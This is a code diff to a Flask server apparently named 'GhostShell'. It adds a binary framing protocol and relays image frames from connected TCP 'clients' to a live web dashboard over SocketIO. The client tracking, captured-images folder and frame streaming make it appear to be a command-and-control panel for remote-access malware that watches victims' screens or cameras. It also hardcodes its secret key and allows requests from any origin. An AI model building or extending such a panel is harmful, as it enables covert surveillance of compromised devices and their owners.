@@ -9,10 +9,12 @@ import psycopg2
 import psycopg2.extras
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, render_template, send_from_directory, redirect, url_for, session
+from flask_socketio import SocketIO, emit
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.secret_key = 'GHOSTSHELL_SECRET_KEY_999'
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 clients = {}
 server_logs = []
@@ -118,20 +120,61 @@ def handle_tcp_data(raw_line, cid):
             add_log(f"Received {t} from {cid}")
     except Exception as e: add_log(f"Error parsing: {e}")
 
+def recv_until(conn, delim):
+    data = b""
+    while True:
+        chunk = conn.recv(1)
+        if not chunk: return None
+        if chunk == delim: return data
+        data += chunk
+
 def client_handler(conn, addr):
     cid = f"{addr[0]}:{addr[1]}"
     with lock: clients[cid] = {'socket': conn, 'data': create_client_data()}
     add_log(f"Client Connected: {cid}")
-    buffer = ""
+    
     try:
         while True:
-            chunk = conn.recv(16384).decode('utf-8', errors='ignore')
-            if not chunk: break
-            buffer += chunk
-            while '\n' in buffer:
-                line, buffer = buffer.split('\n', 1)
-                if line.strip(): handle_tcp_data(line.strip(), cid)
-    except: pass
+            # Protocol detection: Read until '|' or first char
+            first_byte = conn.recv(1, socket.MSG_PEEK)
+            if not first_byte: break
+            
+            if first_byte == b'{':
+                # Old JSON Protocol (per line)
+                line = b""
+                while True:
+                    b = conn.recv(1)
+                    if not b or b == b'\n': break
+                    line += b
+                if line.strip(): handle_tcp_data(line.decode('utf-8', errors='ignore'), cid)
+            else:
+                # New Protocol: HEADER|DEVICE_ID|LENGTH|PAYLOAD
+                header = recv_until(conn, b'|')
+                if header is None: break
+                
+                dev_id = recv_until(conn, b'|')
+                if dev_id is None: break
+                
+                length_bytes = recv_until(conn, b'|')
+                if length_bytes is None: break
+                
+                try:
+                    length = int(length_bytes)
+                    payload = b""
+                    while len(payload) < length:
+                        chunk = conn.recv(min(length - len(payload), 8192))
+                        if not chunk: break
+                        payload += chunk
+                    
+                    if header == b'FRAME':
+                        # Forward to dashboard via SocketIO
+                        encoded_frame = base64.b64encode(payload).decode('utf-8')
+                        socketio.emit('stream_frame', {'id': cid, 'frame': encoded_frame})
+                except Exception as e:
+                    add_log(f"Protocol Error: {e}")
+                    break
+    except Exception as e:
+        add_log(f"Handler Error: {e}")
     finally:
         with lock: 
             if cid in clients: del clients[cid]
@@ -273,4 +316,5 @@ def serve_img(f): return send_from_directory('captured_images', f)
 if __name__ == '__main__':
     init_db()
     threading.Thread(target=tcp_server, daemon=True).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
+    socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
+
